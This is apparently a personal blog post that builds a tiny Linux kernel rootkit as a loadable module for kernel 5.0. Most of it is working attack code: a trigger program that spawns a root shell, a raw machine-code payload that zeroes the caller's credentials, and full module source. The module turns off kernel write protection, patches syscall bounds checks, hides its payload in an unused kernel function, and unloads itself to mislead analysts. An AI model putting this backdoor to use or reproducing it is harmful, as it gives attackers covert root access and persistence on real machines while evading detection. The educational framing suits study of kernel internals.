# A super tiny rootkit

## Abstract

In my exploration of low-level skills, I decided to enhance my skills in Linux kernel development by undertaking a project to create a minimalistic rootkit. This endeavor aims to delve into Linux Kernel Modules (LKM), understand the process of patching the kernel at runtime, and explore techniques for concealing our presence to some extent.

## Content

- [A super tiny rootkit](#a-super-tiny-rootkit)
  - [Abstract](#abstract)
  - [Content](#content)
  - [Introduction](#introduction)
  - [How this rootkit works](#how-this-rootkit-works)
    - [Kernel configuration](#kernel-configuration)
    - [Rootkit interface](#rootkit-interface)
    - [Rootkit implementation](#rootkit-implementation)
  - [Conclusion](#conclusion)

## Introduction

Welcome back! Today, I'll introduce you to an tiny rootkit project, which has pushed me to deepen my knowledge of the Linux kernel. The mission is to create a Loadable Kernel Module (LKM) that empowers a user to gain root access without the need for the root password. The module should also possess a degree of stealthiness. Let's explore the intricacies of this endeavor!

## How this rootkit works

### Kernel configuration

I'll be developing this rootkit for the 5.0 kernel release, with a focus on minimalizing kernel features. The kernel configuration will exclude network capabilities, retaining only essential drivers for keyboard usage, and omitting additional security features. 

### Rootkit interface

To enable a user to attain root access, I want them utilizing the following code snippet:

```c
#include <stdlib.h>
#include <sys/syscall.h>
#include <unistd.h>

int main(void) {
    syscall(SYS_rseq+1);
    system("/bin/sh");
    return 0;
}
```

Given that the `SYS_rseq` syscall is the last entry in the syscall table of my kernel, the plan is to dynamically add a syscall at runtime to avoid really easy detection via `sys_call_table` pointers comparison with value they must have. This new syscall will be responsible for changing the user ID (uid) and group ID (gid) of the caller to 0, effectively granting root privileges. 

### Rootkit implementation

After conducting some research, I located the syscall table in the kernel, which is referenced by the `sys_call_table` symbol:

- https://github.com/torvalds/linux/blob/615d300648869c774bd1fe54b4627bb0c20faed4/arch/x86/entry/syscall_64.c#L16

```c
asmlinkage const sys_call_ptr_t sys_call_table[] = {
#include <asm/syscalls_64.h>
};
```

Following the `asm/syscalls_64.h` header, we can find the definition of this array elements:

```c
#ifdef CONFIG_X86
__SYSCALL_64(0, __x64_sys_read, )
#else /* CONFIG_UML */
__SYSCALL_64(0, sys_read, )
#endif
#ifdef CONFIG_X86
__SYSCALL_64(1, __x64_sys_write, )
#else /* CONFIG_UML */
__SYSCALL_64(1, sys_write, )
#endif
//
// [...] CODE OMMITED
//
#ifdef CONFIG_X86_X32_ABI
__SYSCALL_64(546, __x32_compat_sys_preadv64v2, )
#endif
#ifdef CONFIG_X86_X32_ABI
__SYSCALL_64(547, __x32_compat_sys_pwritev64v2, )
#endif
```

It's intriguing to observe a gap between the last regular syscall (334, which corresponds to `SYS_rseq`) and the first compatibility syscall. In theory, it seems plausible to insert another syscall at runtime in this space, doesn't it? Spoiler, yes but no. In fact, it is not possible to call a new syscall just by adding it in the `sys_call_table` at runtime without patching the kernel. I will show you why:

- https://github.com/torvalds/linux/blob/615d300648869c774bd1fe54b4627bb0c20faed4/arch/x86/entry/common.c#L42

```c
static __always_inline bool do_syscall_x64(struct pt_regs *regs, int nr)
{
	/*
	 * Convert negative numbers to very high and thus out of range
	 * numbers for comparisons.
	 */
	unsigned int unr = nr;

	if (likely(unr < NR_syscalls)) {
		unr = array_index_nospec(unr, NR_syscalls);
		regs->ax = sys_call_table[unr](regs);
		return true;
	}
	return false;
}
```

This function is part of the call graph for the function invoked when a `syscall` instruction occurs. As you can observe, the initial check compares the `NR_syscalls`, which is a hardcoded defined constant representing the number of syscalls in the syscall table (in our case, 335), with the `unr` variable, denoting the number of the syscall called by the user. Another discreet check is embedded within the `array_index_nospec` macro:

```c
/*
 * array_index_nospec - sanitize an array index after a bounds check
 *
 * For a code sequence like:
 *
 *     if (index < size) {
 *         index = array_index_nospec(index, size);
 *         val = array[index];
 *     }
 *
 * ...if the CPU speculates past the bounds check then
 * array_index_nospec() will clamp the index within the range of [0,
 * size).
 */
#define array_index_nospec(index, size)
//
// [...] CODE OMMITED
//
```

As the comment explains, this code is crafted to prevent a speculative branchment from accessing an out-of-bounds array. So to summarize, we must patch these two checks to allow a syscall higher than the maximum in the current compiled kernel. We will link this C code with the real compiled instructions. To find these instructions, we must look at the `do_syscall_64` functions as the `do_syscall_x64` is set as `__always_inline` :

```asm
gef➤  disas do_syscall_64
Dump of assembler code for function do_syscall_64:
#
# [...] CODE OMMITED
#
   0xffffffff81001df7 <+39>:    cmp    rdi,0x14e
   0xffffffff81001dfe <+46>:    ja     0xffffffff81001e1b <do_syscall_64+75>
   0xffffffff81001e00 <+48>:    cmp    rdi,0x14f
#
# [...] CODE OMMITED
#
```

The two `cmp` instructions are the ones we need to patch. We'll modify the first one to `cmp rdi, 0x14f` and the second one to `cmp rdi, 0x150`. Now, the very next step is to develop a function that makes the caller become root. To achieve this, I will draw inspiration from the basic approach in kernel exploitation: leveraging `prepare_creds` to allocate a `cred` struct and using `commit_creds` to ensure that this new struct is applied. Following the call to `prepare_creds`, I will set the different UIDs to zero. The following code represents my simple implementation for gaining root access:

```asm
0xffffffff810019f0 <+0>:     call   0xffffffff8106a410 <prepare_creds>
0xffffffff810019f5 <+5>:     mov    QWORD PTR [rax+0x4],0x0
0xffffffff810019fd <+13>:    mov    QWORD PTR [rax+0xc],0x0
0xffffffff81001a05 <+21>:    mov    QWORD PTR [rax+0x14],0x0
0xffffffff81001a0d <+29>:    mov    rdi,rax
0xffffffff81001a10 <+32>:    call   0xffffffff8106a090 <commit_creds>
0xffffffff81001a15 <+37>:    xor    eax,eax
0xffffffff81001a17 <+39>:    ret
```

We have a method to add a syscall, and we have the code to be executed by this syscall. The final step is to identify where we can place the payload. To ensure our rootkit continues to function even if unloaded, it would be beneficial to find a function in the kernel that is not frequently called. We can then modify this function with our payload, ensuring persistence in the kernel until a reboot. After some research, I found the `perf_trace_sys_enter` function which seems not called...but is still present. It is really cool for us. All is ready to cook so let's code!

```c
#include <asm/processor-flags.h>
#include <asm/syscall.h>
#include <asm/unistd.h>
#include <linux/cred.h>
#include <linux/init.h>
#include <linux/kallsyms.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/sched.h>

//
//  This array correspond to the following code:
//
//    0xffffffff810019f0 <+0>:     call   0xffffffff8106a410 <prepare_creds>
//    0xffffffff810019f5 <+5>:     mov    QWORD PTR [rax+0x4],0x0
//    0xffffffff810019fd <+13>:    mov    QWORD PTR [rax+0xc],0x0
//    0xffffffff81001a05 <+21>:    mov    QWORD PTR [rax+0x14],0x0
//    0xffffffff81001a0d <+29>:    mov    rdi,rax
//    0xffffffff81001a10 <+32>:    call   0xffffffff8106a090 <commit_creds>
//    0xffffffff81001a15 <+37>:    xor    eax,eax
//    0xffffffff81001a17 <+39>:    ret
//
static char rootkit_sys_root[] = { 0xe8, 0x1b, 0x8a, 0x06, 0x00, 0x48, 0xc7, 0x40, 0x04, 0x00, 0x00, 0x00, 0x00, 0x48, 0xc7, 0x40, 0x0c, 0x00, 0x00, 0x00, 0x00, 0x48, 0xc7, 0x40, 0x14, 0x00, 0x00, 0x00, 0x00, 0x48, 0x89, 0xc7, 0xe8, 0x7b, 0x86, 0x06, 0x00, 0x31, 0xc0, 0xc3 };

//
// Helpers to interract with the cr0 register
//
static inline unsigned long __read_cr0(void) {
	unsigned long val;
	asm volatile("mov %%cr0,%0\n\t" : "=r" (val), "=m" (__force_order));
	return val;
}

static inline void __write_cr0(unsigned long val) {
	asm volatile("mov %0,%%cr0": : "r" (val), "m" (__force_order));
}

//
// Helpers to set/unset the WR bit of the cr0 register.
// Really helpful as we must be able to write even pages
// which are not marked as writable.
//
static inline void rootkit_enable_writes(void) {
    __write_cr0(__read_cr0() & ~X86_CR0_WP);
}

static inline void rootkit_disable_writes(void) {
    __write_cr0(__read_cr0() | X86_CR0_WP);
}

//
// Write the payload into the perf_trace_sys_enter function and add the pointer to this function
// at the end of the syscall table.
//
static void rootkit_add_syscall(void) {
    int i;
    sys_call_ptr_t *rootkit_sys_call_table = (sys_call_ptr_t *)kallsyms_lookup_name("sys_call_table");
    char *rootkit_sys_root_persistent_location = (char *)kallsyms_lookup_name("perf_trace_sys_enter");
    rootkit_enable_writes();
    for(i=0; i<sizeof(rootkit_sys_root); i++) {
        rootkit_sys_root_persistent_location[i] = rootkit_sys_root[i];
    }
    rootkit_sys_call_table[__NR_rseq+1] = (sys_call_ptr_t)rootkit_sys_root_persistent_location;
    rootkit_disable_writes();
}

//
// Patch the following do_syscall_64 instructions:
//
//    0xffffffff81001df7 :    cmp    rdi,0x14e
//    0xffffffff81001e00 :    cmp    rdi,0x14f
//
// into:
//
//    0xffffffff81001df7 :    cmp    rdi,0x14f
//    0xffffffff81001e00 :    cmp    rdi,0x150
//
// to allow our new syscall to be called.
//
static void rootkit_patch_do_syscall_64(void) {
    char *do_syscall_64_arr = (char *)kallsyms_lookup_name("do_syscall_64");
    rootkit_enable_writes();
    do_syscall_64_arr[42] = 0x4f;
    do_syscall_64_arr[51] = 0x50;
    rootkit_disable_writes();
}

static int __init rootkit_init(void) {
    rootkit_add_syscall();
    rootkit_patch_do_syscall_64();
    //
    // Enforce module to be removed from ram and write an error in dmesg to
    // fool the analyst
    //
    return -1;
}

static void __exit rootkit_exit(void) {}

module_init(rootkit_init);
module_exit(rootkit_exit);

MODULE_AUTHOR("aiglematth");
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("My tiny rootkit");
MODULE_VERSION("0.1");
```

## Conclusion

This tiny rootkit provides users with a means to gain root access. It achieves this by dynamically adding a new syscall at runtime, circumventing basic syscall table checks, as our syscall falls outside the scope of the syscall table. For persistence, the module dynamically patches the kernel at runtime, making it responsible for the kernel patch rather than the capabilities it offers. As mentioned, it's a highly minimalistic project and doesn't implement sophisticated hiding mechanisms. I hope you found this blog post enjoyable! Bye bye!